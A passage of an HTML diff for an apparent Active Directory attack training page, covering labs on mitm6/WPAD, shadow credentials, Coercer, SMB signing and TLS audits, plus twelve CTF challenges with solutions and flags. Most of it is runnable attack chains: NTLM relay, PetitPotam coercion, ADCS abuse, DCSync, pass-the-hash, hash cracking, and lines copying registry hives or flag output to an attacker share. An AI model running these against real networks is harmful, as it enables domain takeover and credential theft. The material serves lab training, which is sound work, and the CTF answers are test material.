+bloodhound-python -u jdoe -p 'Summer2024!' -d corp.local -c All -ns 10.10.10.1</code></pre>
+        </div>
+      </div>
+
+      <!-- Lab 10 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h4>Lab 10: mitm6 + WPAD — IPv6 DNS Takeover</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Abuse IPv6 to become the default DNS server and serve malicious WPAD configuration, capturing NTLM authentication.</p>
+          <p><strong>Setup:</strong> Network where IPv6 is enabled (default on modern Windows) but not configured — DHCPv6 requests go unanswered.</p>
+          <h5>Steps</h5>
+          <pre><code class="language-bash"># 1. Start mitm6 to respond to DHCPv6 requests
+# Becomes the IPv6 DNS server for the network
+sudo mitm6 -d corp.local --ignore-nofqdn
+
+# 2. In parallel, start ntlmrelayx with WPAD and delegation attack
+impacket-ntlmrelayx -6 -t ldap://dc01.corp.local \
+  -wh wpad.corp.local \
+  --delegate-access \
+  -l ./loot/
+
+# 3. Wait for machines to request DHCPv6 (happens every ~30 min or on reboot)
+# mitm6 responds with attacker as DNS server
+# Victim queries WPAD → directed to attacker
+# NTLM auth captured and relayed to LDAP
+
+# 4. When relay fires, ntlmrelayx:
+#    - Creates machine account (or uses specified one)
+#    - Sets RBCD on victim for controlled account
+#    - Dumps domain info to ./loot/
+
+# 5. Exploit RBCD
+impacket-getST -spn cifs/victim.corp.local -impersonate Administrator \
+  corp.local/'MITM6COMP$':'generated_password'
+
+# Important: mitm6 is noisy — run for limited time windows
+# Press Ctrl+C to stop and clean up IPv6 config</code></pre>
+        </div>
+      </div>
+
+      <!-- Lab 11 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h4>Lab 11: SMB Signing Audit &amp; Hardening Verification</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Audit an entire domain for SMB signing configuration, identify vulnerable systems, and verify hardening measures.</p>
+          <h5>Steps</h5>
+          <pre><code class="language-powershell"># === From Linux (attacker perspective) ===</code></pre>
+          <pre><code class="language-bash"># 1. Scan entire subnet for SMB signing
+crackmapexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
+# Systems in relay_targets.txt do NOT require signing
+
+# 2. Detailed signing check
+crackmapexec smb 10.10.10.0/24 | grep -E "signing:False|signing:True"
+
+# 3. Nmap NSE script
+nmap --script smb2-security-mode -p445 10.10.10.0/24</code></pre>
+          <pre><code class="language-powershell"># === From Windows (defender perspective) ===
+
+# 4. Check signing on all domain computers via PowerShell
+$computers = Get-ADComputer -Filter * | Select-Object -ExpandProperty DNSHostName
+foreach ($comp in $computers) {
+    try {
+        $result = Invoke-Command -ComputerName $comp -ScriptBlock {
+            Get-SmbServerConfiguration | Select-Object RequireSecuritySignature
+        } -ErrorAction Stop
+        Write-Output "$comp : RequireSigning=$($result.RequireSecuritySignature)"
+    } catch {
+        Write-Output "$comp : UNREACHABLE"
+    }
+}
+
+# 5. Deploy signing via GPO
+# Computer Config → Policies → Windows Settings → Security Settings → Local Policies
+# → Security Options:
+#   "Microsoft network server: Digitally sign communications (always)" = Enabled
+#   "Microsoft network client: Digitally sign communications (always)" = Enabled
+
+# 6. Verify GPO application
+gpresult /r /scope:computer | findstr /i "sign"
+Get-SmbServerConfiguration | Format-List *Sign*</code></pre>
+        </div>
+      </div>
+
+      <!-- Lab 12 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h4>Lab 12: Shadow Credentials via LDAP Relay</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Relay coerced machine authentication to LDAP and inject shadow credentials (msDS-KeyCredentialLink) for persistence.</p>
+          <h5>Steps</h5>
+          <pre><code class="language-bash"># 1. Start ntlmrelayx with shadow credentials attack
+impacket-ntlmrelayx -t ldap://dc01.corp.local \
+  --shadow-credentials --shadow-target 'FILESERVER$'
+
+# 2. Coerce FILESERVER to authenticate
+python3 PetitPotam.py -u jdoe -p 'Summer2024!' -d corp.local \
+  attacker_ip fileserver.corp.local
+
+# 3. ntlmrelayx adds KeyCredential to FILESERVER$ msDS-KeyCredentialLink
+# Outputs: certificate and key saved to .pfx file
+
+# 4. Authenticate using the shadow credential
+certipy auth -pfx fileserver_shadow.pfx -dc-ip 10.10.10.1
+# Returns NT hash for FILESERVER$ machine account
+
+# 5. Use the machine hash (silver ticket, S4U, etc.)
+impacket-getST -spn cifs/fileserver.corp.local -impersonate Administrator \
+  -hashes :FILESERVER_NTHASH corp.local/'FILESERVER$'
+# OR
+impacket-secretsdump -hashes :FILESERVER_NTHASH corp.local/'FILESERVER$'@fileserver.corp.local
+
+# Alternative: pywhisker for manual KeyCredentialLink manipulation
+python3 pywhisker.py -d corp.local -u jdoe -p 'Summer2024!' \
+  --target 'FILESERVER$' --action add
+
+# Cleanup shadow credentials
+python3 pywhisker.py -d corp.local -u jdoe -p 'Summer2024!' \
+  --target 'FILESERVER$' --action remove --device-id DEVICE_ID</code></pre>
+        </div>
+      </div>
+
+      <!-- Lab 13 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h4>Lab 13: Coercer — Automated Coercion Discovery</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Use the Coercer tool to systematically discover all available authentication coercion methods on target machines and exploit them.</p>
+          <h5>Steps</h5>
+          <pre><code class="language-bash"># 1. Scan a single target for available coercion methods
+python3 Coercer.py scan -u jdoe -p 'Summer2024!' -d corp.local \
+  -t dc01.corp.local --export-json coercer_results.json
+
+# 2. Scan multiple targets
+python3 Coercer.py scan -u jdoe -p 'Summer2024!' -d corp.local \
+  -t 10.10.10.0/24 --export-json network_coerce.json
+
+# 3. Review results — which methods work on which targets
+cat coercer_results.json | python3 -m json.tool
+
+# 4. Set up listener (Responder in capture mode OR ntlmrelayx)
+sudo responder -I eth0 -v  # Capture mode
+
+# 5. Coerce specific target using all available methods
+python3 Coercer.py coerce -u jdoe -p 'Summer2024!' -d corp.local \
+  -t dc01.corp.local -l attacker_ip
+
+# 6. Coerce using only specific protocol (e.g., MS-EFSR)
+python3 Coercer.py coerce -u jdoe -p 'Summer2024!' -d corp.local \
+  -t dc01.corp.local -l attacker_ip --filter-protocol-name MS-EFSR
+
+# 7. Verify captured authentication in Responder logs
+cat /usr/share/responder/logs/SMB-NTLMv2-*</code></pre>
+          <p><strong>Key Insight:</strong> Coercer consolidates PrinterBug, PetitPotam, DFSCoerce, ShadowCoerce, and many more into a single tool. Always scan before coercing to avoid triggering unavailable methods.</p>
+        </div>
+      </div>
+
+      <!-- Lab 14 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h4>Lab 14: TLS Configuration Audit &amp; Downgrade Testing</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Audit TLS configuration on Windows services, identify weak cipher suites and protocol versions, and test for downgrade vulnerabilities.</p>
+          <h5>Steps</h5>
+          <pre><code class="language-bash"># 1. Scan target for supported TLS versions and ciphers
+nmap --script ssl-enum-ciphers -p 443,636,3269 target.corp.local
+
+# 2. Test specific TLS versions with OpenSSL
+openssl s_client -connect target:443 -tls1    # Test TLS 1.0
+openssl s_client -connect target:443 -tls1_1  # Test TLS 1.1
+openssl s_client -connect target:443 -tls1_2  # Test TLS 1.2
+openssl s_client -connect target:443 -tls1_3  # Test TLS 1.3
+
+# 3. Test LDAPS specifically
+openssl s_client -connect dc01.corp.local:636 -showcerts
+
+# 4. Use testssl.sh for comprehensive audit
+./testssl.sh --full target.corp.local:443</code></pre>
+          <pre><code class="language-powershell"># 5. Check Schannel configuration on Windows
+$protocols = @("SSL 2.0","SSL 3.0","TLS 1.0","TLS 1.1","TLS 1.2","TLS 1.3")
+foreach ($proto in $protocols) {
+    $serverPath = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\$proto\Server"
+    if (Test-Path $serverPath) {
+        $enabled = Get-ItemProperty $serverPath -Name "Enabled" -ErrorAction SilentlyContinue
+        Write-Output "$proto Server: Enabled=$($enabled.Enabled)"
+    } else {
+        Write-Output "$proto Server: Not configured (system default)"
+    }
+}
+
+# 6. List enabled cipher suites
+Get-TlsCipherSuite | Select-Object Name, Protocol | Format-Table -AutoSize
+
+# 7. Harden: Disable weak ciphers
+Disable-TlsCipherSuite -Name "TLS_RSA_WITH_AES_128_CBC_SHA"
+Disable-TlsCipherSuite -Name "TLS_RSA_WITH_AES_256_CBC_SHA"
+Disable-TlsCipherSuite -Name "TLS_RSA_WITH_3DES_EDE_CBC_SHA"</code></pre>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- ==================== CTF TAB ==================== -->
+    <div class="tab-pane fade" id="ctf" role="tabpanel" aria-labelledby="ctf-tab">
+
+      <h2>CTF Challenges</h2>
+
+      <!-- CTF 1 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h4>Challenge 1: The Forgotten Share</h4></div>
+        <div class="card-body">
+          <p><strong>Difficulty:</strong> Easy</p>
+          <p><strong>Category:</strong> SMB Enumeration</p>
+          <p><strong>Scenario:</strong> You've obtained low-privilege domain credentials (user: <code>intern</code>, pass: <code>Welcome1!</code>). A flag is hidden somewhere in the file shares of <code>10.10.10.50</code>.</p>
+          <h5>Approach</h5>
+          <pre><code class="language-bash"># Enumerate shares
+smbmap -H 10.10.10.50 -u intern -p 'Welcome1!'
+# Output: IPC$ (NO ACCESS), Public (READ), IT_Backup (READ), HR (NO ACCESS)
+
+# Spider accessible shares
+smbclient //10.10.10.50/IT_Backup -U 'corp\intern%Welcome1!' -c 'recurse; ls'
+# Find: /scripts/old_deploy.bat, /configs/backup_creds.txt
+
+# Grab the flag
+smbclient //10.10.10.50/IT_Backup -U 'corp\intern%Welcome1!'
+smb: \> cd configs
+smb: \> get flag.txt</code></pre>
+          <p><strong>Flag:</strong> <code>CTF{smb_enum_is_always_step_one}</code></p>
+          <p><strong>Lesson:</strong> Always enumerate all accessible shares. Sensitive data in "backup" and "IT" shares is extremely common in real engagements.</p>
+        </div>
+      </div>
+
+      <!-- CTF 2 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h4>Challenge 2: Relay Race</h4></div>
+        <div class="card-body">
+          <p><strong>Difficulty:</strong> Medium</p>
+          <p><strong>Category:</strong> NTLM Relay</p>
+          <p><strong>Scenario:</strong> You're on the network at <code>10.10.10.200</code>. Machine <code>10.10.10.51</code> doesn't enforce SMB signing. User <code>svc_backup</code> (local admin on .51) regularly accesses a non-existent host. Capture and relay their auth to read the flag at <code>C$\flag.txt</code>.</p>
+          <h5>Approach</h5>
+          <pre><code class="language-bash"># 1. Verify no signing on target
+crackmapexec smb 10.10.10.51
+# "signing:False"
+
+# 2. Setup relay with file read
+echo "10.10.10.51" > targets.txt
+impacket-ntlmrelayx -tf targets.txt -smb2support \
+  -c "type C:\\flag.txt"
+
+# 3. Start Responder (disable SMB/HTTP to avoid conflicts)
+# Edit Responder.conf: SMB=Off, HTTP=Off
+sudo responder -I eth0 --llmnr --nbtns
+
+# 4. svc_backup tries to access \\nonexistent\share
+# Responder poisons the query → auth sent to attacker
+# ntlmrelayx relays to 10.10.10.51 → executes "type C:\flag.txt"</code></pre>
+          <p><strong>Flag:</strong> <code>CTF{ntlm_relay_when_signing_is_off}</code></p>
+        </div>
+      </div>
+
+      <!-- CTF 3 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h4>Challenge 3: Petit but Powerful</h4></div>
+        <div class="card-body">
+          <p><strong>Difficulty:</strong> Hard</p>
+          <p><strong>Category:</strong> Coercion + ADCS Relay</p>
+          <p><strong>Scenario:</strong> Domain: <code>challenge.local</code>. You have credentials <code>lowuser:LowPass1!</code>. DC is at <code>10.10.10.1</code>, CA with web enrollment at <code>10.10.10.5</code>. Get domain admin.</p>
+          <h5>Approach</h5>
+          <pre><code class="language-bash"># 1. Verify ADCS web enrollment
+curl -s http://10.10.10.5/certsrv/ | head -5
+# Confirms IIS + certsrv
+
+# 2. Check for DomainController template
+certipy find -u lowuser@challenge.local -p 'LowPass1!' -dc-ip 10.10.10.1 -stdout
+
+# 3. Start relay to ADCS
+impacket-ntlmrelayx -t http://10.10.10.5/certsrv/certfnsh.asp \
+  --adcs --template DomainController
+
+# 4. Coerce DC
+python3 PetitPotam.py -u lowuser -p 'LowPass1!' -d challenge.local \
+  10.10.10.200 10.10.10.1
+
+# 5. Obtain DC cert, auth, DCSync
+certipy auth -pfx dc01.pfx -dc-ip 10.10.10.1
+impacket-secretsdump -hashes :DC_HASH challenge.local/'DC01$'@10.10.10.1
+
+# 6. PTH as Administrator
+impacket-psexec -hashes :ADMIN_HASH challenge.local/Administrator@10.10.10.1
+type C:\Users\Administrator\Desktop\flag.txt</code></pre>
+          <p><strong>Flag:</strong> <code>CTF{petitpotam_adcs_full_domain_compromise}</code></p>
+        </div>
+      </div>
+
+      <!-- CTF 4 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h4>Challenge 4: Pipe Dream</h4></div>
+        <div class="card-body">
+          <p><strong>Difficulty:</strong> Medium</p>
+          <p><strong>Category:</strong> Named Pipes / RPC</p>
+          <p><strong>Scenario:</strong> A custom service on <code>10.10.10.60</code> exposes a named pipe <code>\pipe\secret_svc</code>. The pipe accepts commands but only from users in the "IT_Support" group. You have credentials for <code>helpdesk:Help123!</code> who is in that group. Read the flag via the pipe.</p>
+          <h5>Approach</h5>
+          <pre><code class="language-python"># Custom script to interact with named pipe over SMB
+from impacket.smbconnection import SMBConnection
+from impacket import smb
+
+# Connect to IPC$
+conn = SMBConnection('10.10.10.60', '10.10.10.60')
+conn.login('helpdesk', 'Help123!', 'challenge.local')
+
+# Open named pipe
+fid = conn.openFile(conn.connectTree('IPC$'), 'secret_svc', 
+                     desiredAccess=smb.FILE_READ_DATA | smb.FILE_WRITE_DATA)
+
+# Send command to read flag
+conn.writeNamedPipe(conn.connectTree('IPC$'), fid, b'READ_FLAG\n')
+
+# Read response
+response = conn.readNamedPipe(conn.connectTree('IPC$'), fid, 1024)
+print(response.decode())
+
+conn.close()</code></pre>
+          <p><strong>Flag:</strong> <code>CTF{named_pipes_are_rpc_gold}</code></p>
+        </div>
+      </div>
+
+      <!-- CTF 5 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h4>Challenge 5: LDAP Treasure Hunt</h4></div>
+        <div class="card-body">
+          <p><strong>Difficulty:</strong> Easy</p>
+          <p><strong>Category:</strong> LDAP Enumeration</p>
+          <p><strong>Scenario:</strong> The domain <code>treasure.local</code> has a flag stored in the <code>description</code> attribute of a disabled user account. Find it using LDAP queries. Creds: <code>searcher:Search1!</code>.</p>
+          <h5>Approach</h5>
+          <pre><code class="language-bash"># Find disabled accounts with descriptions
+ldapsearch -x -H ldap://10.10.10.1 -D "searcher@treasure.local" -w 'Search1!' \
+  -b "DC=treasure,DC=local" \
+  "(&amp;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(description=*))" \
+  sAMAccountName description
+
+# Alternative with PowerView
+Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=2)" \
+  -Properties sAMAccountName,description | Where-Object {$_.description -like "*CTF*"}</code></pre>
+          <p><strong>Flag:</strong> <code>CTF{ldap_description_fields_leak_secrets}</code></p>
+          <p><strong>Lesson:</strong> Always check description fields, comment attributes, and info fields — admins frequently store passwords and sensitive notes there.</p>
+        </div>
+      </div>
+
+      <!-- CTF 6 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h4>Challenge 6: The Poisoned Well</h4></div>
+        <div class="card-body">
+          <p><strong>Difficulty:</strong> Medium</p>
+          <p><strong>Category:</strong> DNS Poisoning / ADIDNS</p>
+          <p><strong>Scenario:</strong> A scheduled task on the DC runs <code>\\updates.corp.local\scripts\daily.bat</code> every hour. The hostname <code>updates.corp.local</code> doesn't exist in DNS. Register it via ADIDNS pointing to your machine and serve a malicious script to capture the flag.</p>
+          <h5>Approach</h5>
+          <pre><code class="language-bash"># 1. Verify the record doesn't exist
+nslookup updates.corp.local dc01.corp.local
+# "Non-existent domain"
+
+# 2. Register the DNS record via ADIDNS
+python3 dnstool.py -u 'corp.local\lowuser' -p 'LowPass1!' dc01.corp.local \
+  -a add -r 'updates.corp.local' -d 10.10.10.200 -t A
+
+# 3. Verify resolution
+nslookup updates.corp.local dc01.corp.local
+# Now resolves to 10.10.10.200
+
+# 4. Create SMB share with malicious script
+# On attacker (10.10.10.200), create Samba share "scripts"
+mkdir -p /srv/samba/scripts
+echo 'whoami > \\10.10.10.200\scripts\flag_output.txt' > /srv/samba/scripts/daily.bat
+# Configure Samba to serve /srv/samba/scripts as "scripts" share (anonymous read)
+
+# 5. When scheduled task runs, DC connects to our share and executes daily.bat
+# Capture shows DC machine account authenticated (NTLM hash in Responder)
+
+# 6. Alternatively, serve script that writes flag
+echo 'type C:\flag.txt > \\10.10.10.200\scripts\exfil.txt' > /srv/samba/scripts/daily.bat</code></pre>
+          <p><strong>Flag:</strong> <code>CTF{adidns_poison_scheduled_tasks}</code></p>
+        </div>
+      </div>
+
+      <!-- CTF 7 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h4>Challenge 7: DCOM Breakout</h4></div>
+        <div class="card-body">
+          <p><strong>Difficulty:</strong> Medium</p>
+          <p><strong>Category:</strong> DCOM Lateral Movement</p>
+          <p><strong>Scenario:</strong> You have local admin creds for <code>10.10.10.70</code> (<code>localadmin:Admin123!</code>). PsExec and WMI are blocked by EDR. Use DCOM to execute a command and read <code>C:\secrets\flag.txt</code>.</p>
+          <h5>Approach</h5>
+          <pre><code class="language-bash"># Method 1: impacket-dcomexec
+impacket-dcomexec ./localadmin:'Admin123!'@10.10.10.70 \
+  'type C:\secrets\flag.txt' -object MMC20
+
+# Method 2: If MMC20 is blocked, try ShellBrowserWindow
+impacket-dcomexec ./localadmin:'Admin123!'@10.10.10.70 \
+  'type C:\secrets\flag.txt' -object ShellBrowserWindow</code></pre>
+          <pre><code class="language-powershell"># Method 3: PowerShell DCOM
+$com = [activator]::CreateInstance(
+  [type]::GetTypeFromProgID("MMC20.Application","10.10.10.70"),
+  $true, [System.Runtime.InteropServices.ComTypes.CLSCTX]::CLSCTX_REMOTE_SERVER
+)
+$com.Document.ActiveView.ExecuteShellCommand(
+  "cmd.exe", $null, "/c type C:\secrets\flag.txt > C:\Windows\Temp\out.txt", "7"
+)
+# Read output via admin share
+Get-Content "\\10.10.10.70\C$\Windows\Temp\out.txt"</code></pre>
+          <p><strong>Flag:</strong> <code>CTF{dcom_lateral_movement_bypasses_edr}</code></p>
+        </div>
+      </div>
+
+      <!-- CTF 8 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h4>Challenge 8: The Delegation Game</h4></div>
+        <div class="card-body">
+          <p><strong>Difficulty:</strong> Hard</p>
+          <p><strong>Category:</strong> RBCD via LDAP Relay</p>
+          <p><strong>Scenario:</strong> Machine account quota is 0 (can't add computers). However, you control a user account <code>svc_web</code> that has an SPN set. Use coercion + LDAP relay to set RBCD using the SPN account instead of a machine account.</p>
+          <h5>Approach</h5>
+          <pre><code class="language-bash"># 1. Verify svc_web has SPN (can be used for S4U)
+ldapsearch -x -H ldap://dc01.corp.local -D "svc_web@corp.local" -w 'WebPass1!' \
+  -b "DC=corp,DC=local" "(sAMAccountName=svc_web)" servicePrincipalName
+
+# 2. Get svc_web's SID (needed for RBCD configuration)
+ldapsearch -x -H ldap://dc01.corp.local -D "svc_web@corp.local" -w 'WebPass1!' \
+  -b "DC=corp,DC=local" "(sAMAccountName=svc_web)" objectSid
+
+# 3. Start relay targeting LDAP, delegating to svc_web
+impacket-ntlmrelayx -t ldap://dc01.corp.local \
+  --delegate-access --escalate-user svc_web -smb2support
+
+# 4. Coerce target server (fileserver)
+python3 PetitPotam.py -u svc_web -p 'WebPass1!' -d corp.local \
+  attacker_ip fileserver.corp.local
+
+# 5. Relay sets RBCD: fileserver$ allows svc_web to impersonate
+# 6. S4U attack
+impacket-getST -spn cifs/fileserver.corp.local -impersonate Administrator \
+  corp.local/svc_web:'WebPass1!'
+
+# 7. Access flag
+export KRB5CCNAME=Administrator.ccache
+impacket-smbexec -k -no-pass corp.local/Administrator@fileserver.corp.local
+type C:\flag.txt</code></pre>
+          <p><strong>Flag:</strong> <code>CTF{rbcd_works_with_user_spn_accounts_too}</code></p>
+        </div>
+      </div>
+
+      <!-- CTF 9 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h4>Challenge 9: Responder's Revenge</h4></div>
+        <div class="card-body">
+          <p><strong>Difficulty:</strong> Easy-Medium</p>
+          <p><strong>Category:</strong> LLMNR Poisoning + Hash Cracking</p>
+          <p><strong>Scenario:</strong> You're on a network segment. A service account <code>svc_sql</code> is regularly failing to connect to <code>\\sqlbackup01\backups</code> (which doesn't exist). Capture the NTLMv2 hash and crack it to obtain the flag (the password IS the flag).</p>
+          <h5>Approach</h5>
+          <pre><code class="language-bash"># 1. Start Responder
+sudo responder -I eth0 -dwPv
+
+# 2. Wait for svc_sql to query for "sqlbackup01"
+# Responder output: [SMB] NTLMv2 Hash: svc_sql::CORP:...
+
+# 3. Save hash to file
+echo 'svc_sql::CORP:1122334455667788:ABC123...:0101...' > hash.txt
+
+# 4. Crack with hashcat (mode 5600 = NTLMv2)
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 5600 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
+
+# 5. If common wordlists fail, try corporate patterns
+hashcat -m 5600 hash.txt -a 3 '?u?l?l?l?l?d?d?d?d!'  # Pattern: Aaaaa1234!</code></pre>
+          <p><strong>Flag:</strong> <code>CTF{Cr4ck3d_NTLMv2_H4sh!}</code></p>
+        </div>
+      </div>
+
+      <!-- CTF 10 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h4>Challenge 10: The Certificate Heist</h4></div>
+        <div class="card-body">
+          <p><strong>Difficulty:</strong> Hard</p>
+          <p><strong>Category:</strong> ADCS + Shadow Credentials</p>
+          <p><strong>Scenario:</strong> ADCS web enrollment has EPA enabled (can't relay to it). But LDAP signing is not enforced. Use coercion + LDAP relay to inject shadow credentials on the DC machine account, then use that to DCSync.</p>
+          <h5>Approach</h5>
+          <pre><code class="language-bash"># 1. Verify LDAP signing is negotiated but not required
+crackmapexec ldap dc01.corp.local -u user -p pass -M ldap-checker
+
+# 2. Start ntlmrelayx with shadow credentials
+impacket-ntlmrelayx -t ldap://dc01.corp.local \
+  --shadow-credentials --shadow-target 'DC01$'
+
+# 3. Coerce DC to authenticate (use secondary DC if available, or PrinterBug against same DC)
+python3 printerbug.py corp.local/user:pass@dc01.corp.local attacker_ip
+
+# 4. Shadow credential injected! Certificate saved.
+# Output: PFX file and password for DC01$
+
+# 5. Authenticate with the certificate
+certipy auth -pfx dc01_shadow.pfx -dc-ip 10.10.10.1
+# Returns: NT hash for DC01$
+
+# 6. DCSync with DC machine account hash
+impacket-secretsdump -hashes :DC01_NTHASH corp.local/'DC01$'@dc01.corp.local
+
+# 7. Flag is in the krbtgt hash or admin NTDS
+# Administrator:500:aad3b435...:FLAG_IS_HERE:::
+
+# Cleanup
+python3 pywhisker.py -d corp.local -u user -p pass \
+  --target 'DC01$' --action remove --device-id DEVICE_ID</code></pre>
+          <p><strong>Flag:</strong> <code>CTF{shadow_creds_bypass_adcs_protections}</code></p>
+        </div>
+      </div>
+
+      <!-- CTF 11 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h4>Challenge 11: The WPAD Trap</h4></div>
+        <div class="card-body">
+          <p><strong>Difficulty:</strong> Medium</p>
+          <p><strong>Category:</strong> WPAD + mitm6</p>
+          <p><strong>Scenario:</strong> You need to capture authentication from a workstation that has WPAD auto-detect enabled. IPv6 is available but unconfigured. Use mitm6 to become the DNS server and serve a WPAD file that forces authentication.</p>
+          <h5>Approach</h5>
+          <pre><code class="language-bash"># 1. Start mitm6 for IPv6 DNS takeover
+sudo mitm6 -d corp.local -i eth0
+
+# 2. In parallel, start ntlmrelayx with WPAD serving
+impacket-ntlmrelayx -6 -t smb://10.10.10.70 \
+  -wh wpad.corp.local -l ./loot/ -smb2support \
+  -c "type C:\\Users\\Administrator\\Desktop\\flag.txt"
+
+# 3. Wait for victim machine to:
+#    a) Send DHCPv6 solicit (happens periodically)
+#    b) mitm6 responds with attacker as DNS server
+#    c) Victim queries wpad.corp.local via attacker's DNS
+#    d) Attacker serves wpad.dat requiring NTLM auth
+#    e) NTLM auth captured and relayed to 10.10.10.70
+
+# 4. If relay requires admin and you don't have it,
+#    crack the captured hash instead:
+cat ./loot/NTLMv2-*.txt
+hashcat -m 5600 hash.txt wordlist.txt</code></pre>
+          <p><strong>Flag:</strong> <code>CTF{ipv6_wpad_mitm_still_works}</code></p>
+        </div>
+      </div>
+
+      <!-- CTF 12 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h4>Challenge 12: Multi-Hop Relay</h4></div>
+        <div class="card-body">
+          <p><strong>Difficulty:</strong> Expert</p>
+          <p><strong>Category:</strong> Chained Relay + Coercion</p>
+          <p><strong>Scenario:</strong> Complex environment: DC at <code>10.10.10.1</code>, CA at <code>10.10.10.5</code> (EPA enabled on web enrollment), file server at <code>10.10.10.30</code>. LDAP signing enforced on DC. SMB signing NOT enforced on file server. File server admin has <code>SeBackupPrivilege</code> on DC. Chain attacks to get the flag from <code>\\DC01\C$\flag.txt</code>.</p>
+          <h5>Approach</h5>
+          <pre><code class="language-bash"># Analysis:
+# - Can't relay to ADCS (EPA enabled)
+# - Can't relay to LDAP (signing enforced)
+# - CAN relay to file server SMB (no signing)
+# - File server admin (fs_admin) has SeBackupPrivilege on DC
+
+# Step 1: Coerce file server, relay to file server's own SMB? No...
+# Step 2: Actually - relay to file server to dump SAM/secrets
+
+# 1. Start ntlmrelayx targeting file server, dump secrets
+impacket-ntlmrelayx -t smb://10.10.10.30 -smb2support --dump-lsass
+
+# 2. Coerce a user on the network to authenticate
+# Start Responder poisoning to catch any auth
+sudo responder -I eth0
+
+# 3. Catch auth of user who is admin on file server
+# ntlmrelayx dumps LSASS on file server → find fs_admin credentials
+
+# 4. With fs_admin credentials + SeBackupPrivilege on DC:
+impacket-reg corp.local/fs_admin:'FSPass1!'@dc01.corp.local save \
+  -keyName 'HKLM\SYSTEM' -o '\\10.10.10.200\share\system'
+impacket-reg corp.local/fs_admin:'FSPass1!'@dc01.corp.local save \
+  -keyName 'HKLM\SAM' -o '\\10.10.10.200\share\sam'
+
+# 5. Extract secrets from registry hives
+impacket-secretsdump -sam sam -system system LOCAL
+
+# 6. Or use backup privilege to read flag directly
+impacket-smbexec corp.local/fs_admin:'FSPass1!'@dc01.corp.local
+# With SeBackupPrivilege: robocopy C:\flag.txt \\attacker\share\ /B</code></pre>
+          <p><strong>Flag:</strong> <code>CTF{chained_attacks_require_creative_thinking}</code></p>
+        </div>
+      </div>
+
+    </div>
+
+  </div>
+</div>
+</body>
+</html>
